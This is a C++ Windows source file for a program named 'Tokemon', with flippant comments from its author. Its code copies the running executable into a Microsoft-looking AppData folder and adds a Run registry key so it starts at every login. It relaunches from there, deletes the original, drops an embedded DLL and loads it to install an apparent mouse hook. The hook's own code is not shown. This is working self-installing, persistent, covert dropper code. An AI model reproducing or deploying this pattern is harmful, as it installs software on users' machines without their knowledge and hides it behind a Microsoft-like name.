#include "main.hpp"

LPWSTR
AllocatePathBuffer
(void)
{
   /* I like to use msvcrt to be kind of a dick when it compiles into an ugly
      godawful binary. hope u got flirt <3 

      also I have no idea why I'm doing everything on the heap lol
      I have been so high throughout the entirety of writing this */
   
   DWORD size = MAX_PATH+1;
   LPWSTR result = (LPWSTR)malloc(sizeof(WCHAR) * size);

   if (result == NULL)
      return result;
   
   memset(result, 0, sizeof(WCHAR) * size);

   return result;
}
   
LPWSTR
GetRunningFileName
(void)
{
   LPWSTR result;
   DWORD size = MAX_PATH+1;

   result = AllocatePathBuffer();

   if (result == NULL)
      return NULL;

   if (!QueryFullProcessImageName(GetCurrentProcess(), 0, result, &size))
   {
      free(result);
      return NULL;
   }

   return result;
}

LPWSTR
GetRunningPath
(void)
{
   LPWSTR result, pointer;

   result = GetRunningFileName();

   if (result == NULL)
      return NULL;

   pointer = result + wcslen(result)-1;

   while (pointer != result && *pointer != L'\\')
      --pointer;

   *pointer = L'\0';

   return result;
}

LPWSTR
GetAppDataPath
(void)
{
   LPWSTR allocatedBuffer, result;

   allocatedBuffer = AllocatePathBuffer();

   if (allocatedBuffer == NULL)
      return NULL;

   if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &result) != S_OK)
   {
      free(allocatedBuffer);
      return NULL;
   }

   wcscpy_s(allocatedBuffer, MAX_PATH+1, result);
   CoTaskMemFree(result);

   return allocatedBuffer;
}

LPWSTR
ExpectedFileName
(BOOL switchVal)
{
   LPWSTR result;
   LPWSTR pathString = L"\\Microsoft\\Toke Monitor\\";

   result = GetAppDataPath();

   if (result == NULL)
      return NULL;

   if (wcsncat_s(result, MAX_PATH+1, pathString, wcslen(pathString)) != 0)
   {
      free(result);
      return NULL;
   }

   if (wcsncat_s(result, MAX_PATH+1, TOKEMON32_FILENAME, wcslen(TOKEMON32_FILENAME)) != 0)
   {
      free(result);
      return NULL;
   }

   if (wcsncat_s(result, MAX_PATH+1, (switchVal) ? L".dll" : L".exe", 4) != 0)
   {
      free(result);
      return NULL;
   }

   return result;
}

LPWSTR
ParseFileName
(LPWSTR fullPath)
{
   LPWSTR pointer;

   pointer = fullPath + wcslen(fullPath)-1;

   while (pointer != fullPath && *pointer != L'\\')
      --pointer;

   if (pointer == fullPath)
      return fullPath;
   else
      return ++pointer;
}

BOOL
DirectoryExists
(LPWSTR fullPath)
{
   DWORD attrib = GetFileAttributes(fullPath);
   return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL
MakeAllDirectories
(LPWSTR fileName)
{
   LPWSTR pointer, eof;

   pointer = &fileName[2];
   eof = &fileName[wcslen(fileName)];

   while (pointer != eof)
   {
      WCHAR oldChar;
      BOOL exists;
      
      if (*pointer != L'\\')
      {
         ++pointer;
         continue;
      }

      /* found a backslash, we hit a directory marker */
      if (&pointer[1] != eof)
      {
         oldChar = pointer[1];
         pointer[1] = L'\0';
      }

      if (!DirectoryExists(fileName) && !CreateDirectory(fileName, NULL))
         return FALSE;
      
      if (&pointer[1] != eof)
         pointer[1] = oldChar;

      ++pointer;
   }

   return TRUE;
}

BOOL
CopyToTargetPath
(void)
{
   LPWSTR wantedFileName, runningFileName;

   wantedFileName = ExpectedFileName(FALSE);

   if (wantedFileName == NULL)
      return FALSE;

   if (!MakeAllDirectories(wantedFileName))
   {
      free(wantedFileName);
      return FALSE;
   }

   runningFileName = GetRunningFileName();

   if (runningFileName == NULL)
   {
      free(wantedFileName);
      return FALSE;
   }

   if (!CopyFile(runningFileName, wantedFileName, FALSE))
   {
      free(wantedFileName);
      free(runningFileName);
      return FALSE;
   }

   return TRUE;
}

void
RelaunchCorrectly
(void)
{
   LPWSTR targetExe, currentExe;
   WCHAR commandLine[MAX_PATH*2 + 32];
   STARTUPINFO startupInfo;
   PROCESS_INFORMATION processInfo;

   targetExe = ExpectedFileName(FALSE);

   if (targetExe == NULL)
      return;

   currentExe = GetRunningFileName();

   if (currentExe == NULL)
   {
      free(targetExe);
      return;
   }

   memset(&startupInfo, 0, sizeof(STARTUPINFO));
   startupInfo.cb = sizeof(STARTUPINFO);
   
   memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

   memset(commandLine, 0, sizeof(commandLine));
   swprintf_s(commandLine, sizeof(commandLine) / sizeof(WCHAR), L"\"%s\" %s", targetExe, currentExe);

   CreateProcess(targetExe
                 ,commandLine
                 ,NULL
                 ,NULL
                 ,FALSE
                 ,0
                 ,NULL
                 ,NULL
                 ,&startupInfo
                 ,&processInfo);

   free(targetExe);
   free(currentExe);
}

BOOL
AddToRegistry
(void)
{
   LPWSTR targetExe;
   WCHAR quotedExe[MAX_PATH+2+1];
   HKEY startup;

   targetExe = ExpectedFileName(FALSE);

   if (targetExe == NULL)
      return FALSE;

   memset(quotedExe, 0, sizeof(quotedExe));
   swprintf_s(quotedExe, MAX_PATH+2+1, L"\"%s\"", targetExe);
   free(targetExe);

   if (RegOpenKeyEx(HKEY_CURRENT_USER
                    ,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                    ,0
                    ,KEY_SET_VALUE
                    ,&startup) != ERROR_SUCCESS)
      return FALSE;

   if (RegSetValueEx(startup
                     ,L"Toke Monitor"
                     ,NULL
                     ,REG_SZ
                     ,(LPBYTE)quotedExe
                     ,(wcslen(quotedExe)+1)*sizeof(WCHAR)) != ERROR_SUCCESS)
      return FALSE;

   return TRUE;
}

void
InstallTokemon
(void)
{
   if (!CopyToTargetPath())
      return;

   if (!AddToRegistry())
      return;

   RelaunchCorrectly();
}

BOOL
DumpHook
(void)
{
   LPWSTR targetDLLName;
   HRSRC dllResource;
   HGLOBAL dllLoaded;
   DWORD dllSize;
   LPBYTE dllBuffer;
   HANDLE dllFileHandle;
   DWORD bytesWritten;

   targetDLLName = ExpectedFileName(TRUE);

   if (targetDLLName == NULL)
      return FALSE;

   dllResource = FindResource(NULL, MAKEINTRESOURCE(IDR_HOOK), L"DLL");

   if (dllResource == NULL)
   {
      free(targetDLLName);
      return FALSE;
   }

   dllSize = SizeofResource(NULL, dllResource);
   dllLoaded = LoadResource(NULL, dllResource);

   if (dllLoaded == NULL)
   {
      free(targetDLLName);
      return FALSE;
   }

   dllBuffer = (LPBYTE)LockResource(dllLoaded);

   if (dllBuffer == NULL)
   {
      free(targetDLLName);
      return FALSE;
   }

   dllFileHandle = CreateFile(targetDLLName
                              ,GENERIC_WRITE
                              ,0
                              ,NULL
                              ,CREATE_ALWAYS
                              ,FILE_ATTRIBUTE_NORMAL
                              ,NULL);

   if (dllFileHandle == INVALID_HANDLE_VALUE)
   {
      free(targetDLLName);
      return FALSE;
   }

   if (!WriteFile(dllFileHandle
                  ,dllBuffer
                  ,dllSize
                  ,&bytesWritten
                  ,NULL))
   {
      free(targetDLLName);
      return FALSE;
   }

   CloseHandle(dllFileHandle);
   free(targetDLLName);
   
   return TRUE;
}

HMODULE
LoadHook
(void)
{
   LPWSTR dllName, dllFile;
   HMODULE result;
   DWORD error;

   dllName = ExpectedFileName(TRUE);

   if (dllName == FALSE)
      return NULL;

   dllFile = ParseFileName(dllName);

   result = LoadLibrary(dllFile);
   error = GetLastError();

   free(dllName);

   return result;
}

void
LaunchTokemon
(LPWSTR oldFile)
{
   BOOL deleted = FALSE;
   HMODULE hookModule;
   void (*loadHookFunc)(void);
   void (*unloadHookFunc)(void);
   HHOOK mouseHook;
   MSG message;

   while (!deleted)
   {
      if (GetFileAttributes(oldFile) == INVALID_FILE_ATTRIBUTES)
      {
         deleted = TRUE;
         continue;
      }
      
      deleted = DeleteFile(oldFile);
      Sleep(1000);
   }

   if (!DumpHook())
      return;

   /* do you see these variable names
      this is what happens when you code high
      don't code high kids
      don't code high */
   
   hookModule = LoadHook();

   loadHookFunc = (void (*)(void))GetProcAddress(hookModule, "LoadHook");

   if (loadHookFunc == NULL)
      return;

   loadHookFunc();

   /* run a message loop to capture mouse messages in the hook we loaded */
   while (GetMessage(&message, NULL, 0, 0) > 0)
   {
      TranslateMessage(&message);
      DispatchMessage(&message);
   }

   /* lol this never gets called but YOU NEVER KNOW I GUESS */
   
   unloadHookFunc = (void (*)(void))GetProcAddress(hookModule, "UnloadHook");

   if (unloadHookFunc == NULL)
      return;

   unloadHookFunc();

   return;
}

int CALLBACK
wWinMain
(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR cmdLine, int nCmdShow)
{
   LPWSTR runningFileName, expectedFileName;

   runningFileName = GetRunningFileName();

   if (runningFileName == NULL)
      goto error_current_filename;

   expectedFileName = ExpectedFileName(FALSE);

   if (expectedFileName == NULL)
      goto error_expected_filename;

   if (wcsncmp(runningFileName, expectedFileName, MAX_PATH+1) != 0)
      InstallTokemon();
   else
      LaunchTokemon(cmdLine);

   free(expectedFileName);
   
error_expected_filename:
   free(runningFileName);
   
error_current_filename:
   return 0;
}
